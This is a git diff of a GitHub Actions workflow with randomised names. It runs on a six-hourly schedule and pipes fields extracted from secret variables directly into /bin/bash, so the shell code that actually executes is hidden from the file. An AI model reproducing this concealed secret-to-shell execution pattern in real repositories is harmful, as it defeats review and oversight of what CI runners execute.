@@ -3,31 +3,22 @@ name: niubenghen8710
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
+    - cron: '45 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: niubenghen8710
         env:
-          cls185: ${{ secrets.cls185 }}
+          clfx00623: ${{ secrets.clfx00623 }}
         run: |
-          echo $cls185 | jq -r .xmz85493 | /bin/bash
-          echo $wsbe74907 | jq -r .vc61 | /bin/bash
-          echo $uawmg60278 | jq -r .hpyz9 | /bin/bash
-          echo $xec0289 | jq -r .vig55 | /bin/bash
-          echo $khikg23872 | jq -r .srngo07426 | /bin/bash
-          echo $xq9907 | jq -r .hbpbv62 | /bin/bash
-          echo $yyq7814 | jq -r .iqycn7015 | /bin/bash
-          echo $r2 | jq -r .h567 | /bin/bash
-          echo $mdlg13614 | jq -r .kuuej87989 | /bin/bash
-          echo $dj77242 | jq -r .n8 | /bin/bash
-          echo $x955 | jq -r .zf406 | /bin/bash
-          echo $nhmn572 | jq -r .aqtq06957 | /bin/bash
-          echo $w99021 | jq -r .megw9 | /bin/bash
-          echo $riufg1 | jq -r .xvdts56063 | /bin/bash
-          echo $wrbvh2 | jq -r .k90 | /bin/bash
-          echo $mq935 | jq -r .rtjyv8870 | /bin/bash
-          echo $aqry7496 | jq -r .heon34 | /bin/bash
+          echo $clfx00623 | jq -r .hgg86 | /bin/bash
+          echo $tnz97838 | jq -r .ew83 | /bin/bash
+          echo $yxor6099 | jq -r .tewsp6 | /bin/bash
+          echo $yns302 | jq -r .fmkxw0 | /bin/bash
+          echo $pmifj492 | jq -r .ge5520 | /bin/bash
+          echo $vvc25736 | jq -r .k86 | /bin/bash
+          echo $tg690 | jq -r .fb2 | /bin/bash
 
